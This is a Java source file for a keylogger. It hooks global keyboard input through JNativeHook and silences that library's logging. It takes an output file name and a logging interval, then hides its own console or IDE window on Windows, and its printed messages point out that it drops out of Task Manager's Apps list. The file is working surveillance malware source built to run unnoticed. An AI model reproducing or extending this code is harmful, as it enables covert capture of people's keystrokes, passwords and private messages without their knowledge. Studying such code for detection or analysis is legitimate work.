import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.swing.*;
import java.awt.event.KeyEvent;
import java.util.Properties;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Main {
    public static void main(String[] args) throws InterruptedException {;

        Logger log = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        log.setLevel(Level.OFF);
        boolean hooked = false;
        String osName = System.getProperty("os.name");
        try {
            System.out.println("Checking your operating system...");
            System.out.println("Your operating system is: " + osName);
            System.out.println("Attempting to hook keylogger into " + osName + "....");
            GlobalScreen.registerNativeHook();
            hooked = true;
            System.out.println("Successfully hooked into " + osName);
        } catch (NativeHookException e) {
            System.out.println("Failed to hook into " + osName + ". Program will terminate.");
        }

        if(hooked){
            String name = getFileName();
            int minutes = getSpecifiedMinutes(name);
            KeyStrokesLogger logger = new KeyStrokesLogger(minutes,name);
            String first = osName.substring(0,7);
            if(first.equals("Windows")){ //will hide the console window and IDE window if using windows OS but you will be able to find the process using CTRL ALT DELETE.
                JUser32 user32 = Native.load("user32",JUser32.class);
                WinDef.HWND win = JUser32.INSTANCE.GetForegroundWindow();
                int gwlStyle = JUser32.INSTANCE.GetWindowLong(win, JUser32.GWL_STYLE);
                JUser32.INSTANCE.ShowWindow(win,JUser32.SW_HIDE);
            }
        }
    }
    private static String getFileName(){
        Scanner scanner = new Scanner(System.in);
        System.out.println("Name of text file you want to write the keylogger to (enter a name without any extensions): ");
        return scanner.nextLine();

    }
    private static int getSpecifiedMinutes(String fileName){
        fileName += ".txt";
        while(true){
            Scanner scanner = new Scanner(System.in);
            System.out.println("*********IMPORTANT*********");
            System.out.println("If you have compiled this application into an EXE, the console window will disappear after you enter the number of minutes.");
            System.out.println("If you are running this application from an IDE, the IDE window will disappear after you enter the number of minutes.");
            System.out.println("After the window is hidden, it will also be hidden in Task Manager under the Apps section.");
            System.out.println("The background processes associated with the hidden task will be visible under the Background processes section in Task Manager.");
            System.out.println("You would have to end all processes associated with the main task in order to completely stop this application.");
            System.out.println("It is better to just restart your computer if you want to make sure the keylogger completely stops instead of ending the associated processes one by one.");
            System.out.println("The keylogger will write keystrokes to " + fileName + " every (enter number of minutes) minutes: ");
            if(scanner.hasNextInt()){
                return scanner.nextInt();
            }else{
                System.out.println("Please enter a number.");
            }
        }
    }
}
